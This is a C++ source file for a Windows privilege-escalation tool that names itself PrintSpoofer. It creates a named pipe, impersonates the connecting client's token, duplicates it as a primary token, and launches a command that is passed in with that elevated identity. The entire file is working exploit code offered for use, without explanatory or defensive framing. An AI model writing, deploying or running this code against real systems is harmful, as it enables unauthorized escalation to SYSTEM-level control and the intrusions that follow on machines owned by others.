#include <Windows.h>
#include <UserEnv.h>
#include <iostream>
#include <sstream>

#pragma comment(lib, "Userenv.lib")

struct ErrorInfo {
	LPCSTR pszFunctionName;
	DWORD dwLastError;

	friend std::ostream& operator<< (std::ostream& ostm, const ErrorInfo& r)
	{
		return ostm << r.pszFunctionName << " failed with error " << r.dwLastError << ".";
	}

	ErrorInfo WriteLine(std::ostream& ostm) const
	{
		ostm << *this << '\n';
		return *this;
	}
};

int main(int argc, wchar_t* argv[])
{

	if (argc < 2) {
		std::cout << "PrintSpoofer.exe <cmd>" << std::endl;
		return EXIT_FAILURE;
	}

	WCHAR               username[256],
                        sysdir[256];

	LPWSTR              cmd          = argv[1];

	DWORD               username_len = sizeof(username) / sizeof(username[0]),
                        sysdir_len   = sizeof(sysdir) / sizeof(sysdir[0]);

	HANDLE              hPipe        = nullptr,
                        tokenHandle  = nullptr,
                        sysToken     = nullptr,
                        env          = nullptr;

	PROCESS_INFORMATION pi;
	STARTUPINFO         si;

	ZeroMemory(&pi, sizeof(pi));
	ZeroMemory(&si, sizeof(si));

	si.cb = sizeof(si);
    si.lpDesktop = const_cast<LPWSTR>(L"WinSta0\\Default");

	hPipe = ::CreateNamedPipe(L"\\\\.\\pipe\\fpipe", PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE | PIPE_WAIT, 1, 0, 4096, 0, nullptr);

	if (hPipe == INVALID_HANDLE_VALUE) {
		ErrorInfo{ "CreateNamedPipe", ::GetLastError() }.WriteLine(std::cout);
		return EXIT_FAILURE;
	}

	if (!::ConnectNamedPipe(hPipe, nullptr)) {
		ErrorInfo{ "ConnectNamedPipe", ::GetLastError() }.WriteLine(std::cout);
		::CloseHandle(hPipe);
		return EXIT_FAILURE;
	}

	if (!::ImpersonateNamedPipeClient(hPipe)) {
		ErrorInfo{ "ImpersonateNamedPipeClient", ::GetLastError() }.WriteLine(std::cout);
		::CloseHandle(hPipe);
		return EXIT_FAILURE;
	}

	if (!::OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, TRUE, &tokenHandle)) {
		ErrorInfo{ "OpenThreadToken", ::GetLastError() }.WriteLine(std::cout);
		::CloseHandle(hPipe);
		return EXIT_FAILURE;
	}

	if (!::DuplicateTokenEx(tokenHandle, TOKEN_ALL_ACCESS, nullptr, SecurityImpersonation, TokenPrimary, &sysToken)) {
		ErrorInfo{ "DuplicateTokenEx", ::GetLastError() }.WriteLine(std::cout);
		::CloseHandle(tokenHandle);
		::CloseHandle(hPipe);
		return EXIT_FAILURE;
	}

	if (!::CreateEnvironmentBlock(&env, sysToken, false)) {
		ErrorInfo{ "CreateEnvironmentBlock", ::GetLastError() }.WriteLine(std::cout);
		::CloseHandle(sysToken);
		::CloseHandle(tokenHandle);
		::CloseHandle(hPipe);
		return EXIT_FAILURE;
	}

	::GetUserName(username, &username_len);
	std::wcout << "Impersonated user is: " << username << "." << std::endl;
	::RevertToSelf();

	::GetSystemDirectory(sysdir, sysdir_len);

	if (!::CreateProcessWithTokenW(sysToken, LOGON_WITH_PROFILE, nullptr, cmd, CREATE_UNICODE_ENVIRONMENT, env, sysdir, &si, &pi)) {
		ErrorInfo{ "CreateProcessWithTokenW", ::GetLastError() }.WriteLine(std::cout);
		::DestroyEnvironmentBlock(env);
		::CloseHandle(sysToken);
		::CloseHandle(tokenHandle);
		::CloseHandle(hPipe);
		return EXIT_FAILURE;
	}

	std::cout << "Executed " << cmd << "with impersonated token!" << std::endl;

	return EXIT_SUCCESS;
}